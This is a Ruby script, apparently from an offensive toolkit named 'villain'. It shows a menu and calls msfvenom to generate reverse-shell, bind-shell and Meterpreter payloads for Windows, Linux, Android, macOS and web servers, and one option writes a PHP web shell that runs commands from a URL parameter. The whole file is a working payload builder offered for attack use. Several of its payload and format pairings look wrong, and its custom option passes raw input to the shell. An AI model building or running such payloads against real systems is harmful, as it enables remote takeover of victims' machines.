#!/usr/bin/env ruby

# Define banner function
def banner
  system("bash villain/data/files/banner.sh")
end

# Define create_payload function
def create_payload
	# Color variables
	green = "\033[1;32m"
	red = "\033[1;31m"
	white = "\033[1;37m"
	cyan = "\033[1;36m"
	reset = "\033[0m"
	yellow = "\033[1;33m"
	magenta = "\033[1;35m"
	blue = "\033[1;34m"

  system("clear")
  banner
  puts "#{white} [#{green}++] #{green}Create a Metasploit Payload"
  puts "#{white} [#{green}01#{white}] #{green}Reverse TCP"
  puts "#{white} [#{green}02#{white}] #{green}Reverse HTTP"
  puts "#{white} [#{green}03#{white}] #{green}Bind TCP"
  puts "#{white} [#{green}04#{white}] #{green}Windows Meterpreter Reverse TCP"
  puts "#{white} [#{green}05#{white}] #{green}Windows Meterpreter Reverse HTTPS"
  puts "#{white} [#{green}06#{white}] #{green}PDF Payload"
  puts "#{white} [#{green}07#{white}] #{green}Android Reverse TCP"
  puts "#{white} [#{green}08#{white}] #{green}Linux Meterpreter Reverse TCP"
  puts "#{white} [#{green}09#{white}] #{green}Custom Payload (Specify Metasploit payload)"
  puts "#{white} [#{green}10#{white}] #{green}Unix Payload"
  puts "#{white} [#{green}11#{white}] #{green}Mac Payload"
  puts "#{white} [#{green}12#{white}] #{green}Web Delivery PHP"
  puts "#{white} [#{green}13#{white}] #{green}Linux ELF Reverse Shell"
  puts "#{white} [#{green}14#{white}] #{green}HTTP/HTTPS Reverse Shell"
  puts "#{white} [#{green}15#{white}] #{green}Windows HTA Payload"
  puts "#{white} [#{green}16#{white}] #{green}Linux Python Payload"
  puts "#{white} [#{green}17#{white}] #{green}Windows PowerShell Payload"
  puts "#{white} [#{green}18#{white}] #{green}Windows Scriptlet Payload"
  puts "#{white} [#{green}19#{white}] #{green}macOS Script Payload"
  puts "#{white} [#{green}20#{white}] #{green}ASP Reverse Shell Payload"
  puts "#{white} [#{green}21#{white}] #{green}JSP Reverse Shell Payload"
  puts "#{white} [#{green}99#{white}] #{green}Back"

  print " \e[1;92m[++] Enter your choice : "
  choice = gets.chomp

  case choice
  when '1', '01'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o payload.exe")
    puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
  when '2', '02'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/meterpreter/reverse_http LHOST=#{lhost} LPORT=#{lport} HttpUserAgent=\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" -f exe -o payload.exe")
    puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
  when '3', '03'
    banner
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/shell/bind_tcp LPORT=#{lport} -f exe -o payload.exe")
    puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
  when '4', '04'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f exe -o payload.exe")
    puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
  when '5', '05'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/meterpreter/reverse_https LHOST=#{lhost} LPORT=#{lport} HttpUserAgent=\"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\" -f exe -o payload.exe")
    puts "#{white} [#{green}++] #{green}Payload 'payload.exe' created."
  when '6', '06'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/meterpreter/pdf_embedded_url LHOST=#{lhost} LPORT=#{lport} -f pdf -o payload.pdf")
    puts "#{white} [#{green}++] #{green}Payload 'payload.pdf' created."
  when '7', '07'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p android/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o payload.apk")
    puts "#{white} [#{green}++] #{green}Payload 'payload.apk' created."
  when '8', '08'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f elf -o payload.elf")
    puts "#{white} [#{green}++] #{green}Payload 'payload.elf' created."
  when '9', '09'
    banner
    print " \e[1;92m[++] Enter the Metasploit payload (e.g., windows/meterpreter/reverse_tcp) : "
    custom_payload = gets.chomp
    print " \e[1;92m[++] Enter any additional options for the payload (if any) : "
    custom_options = gets.chomp
    print "Enter the output file name: "
    custom_output = gets.chomp
    system("msfvenom -p #{custom_payload} #{custom_options} -o #{custom_output}")
    puts "#{white} [#{green}++] #{green}Payload '#{custom_output}' created."
  when '10'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p shell/reverse_unix LHOST=#{lhost} LPORT=#{lport} -f raw -o payload.sh")
    puts "#{white} [#{green}++] #{green}Payload 'payload.sh' created."
  when '11'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f macho -o payload.macho")
    puts "#{white} [#{green}++] #{green}Payload 'payload.macho' created."
  when '12'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    File.open('payload.php', 'w') { |file| file.write("<?php system(\$_GET['cmd']); ?>") }
    puts "#{white} [#{green}++] #{green}Payload 'payload.php' created."
  when '13'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p linux/x86/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f elf -o payload.elf")
    puts "#{white} [#{green}++] #{green}Payload 'payload.elf' created."
  when '14'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    print " \e[1;92m[++] Use HTTP or HTTPS (http/https) : "
    http_protocol = gets.chomp
    system("msfvenom -p php/meterpreter_reverse_#{http_protocol} LHOST=#{lhost} LPORT=#{lport} -o payload.#{http_protocol}")
    puts "#{white} [#{green}++] #{green}Payload 'payload.#{http_protocol}' created."
  when '15'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/hta_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f hta-psh -o payload.hta")
    puts "#{white} [#{green}++] #{green}Payload 'payload.hta' created."
  when '16'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p cmd/unix/reverse_python LHOST=#{lhost} LPORT=#{lport} -o payload.py")
    puts "#{white} [#{green}++] #{green}Payload 'payload.py' created."
  when '17'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/powershell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o payload.ps1")
    puts "#{white} [#{green}++] #{green}Payload 'payload.ps1' created."
  when '18'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/scriptlet/wscr_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -o payload.sct")
    puts "#{white} [#{green}++] #{green}Payload 'payload.sct' created."
  when '19'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f sct -o payload.sct")
    puts "#{white} [#{green}++] #{green}Payload 'payload.sct' created."
  when '20'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p windows/shell/reverse_asp LHOST=#{lhost} LPORT=#{lport} -f asp -o payload.asp")
    puts "#{white} [#{green}++] #{green}Payload 'payload.asp' created."
  when '21'
    banner
    print " \e[1;92m[++] Enter the LHOST (e.g., your IP address) : "
    lhost = gets.chomp
    print " \e[1;92m[++] Enter the LPORT (e.g., a port number) : "
    lport = gets.chomp
    system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{lhost} LPORT=#{lport} -f raw -o payload.jsp")
    puts "#{white} [#{green}++] #{green}Payload 'payload.jsp' created."
  when '99'
    puts "#{white} [#{red}☠☠#{white}] #{red}Main Menu"
    exit 0
  else
    puts "#{white} [#{red}☠☠#{white}] #{red}Invalid choice..."
    sleep 3
    create_payload
  end
end

create_payload
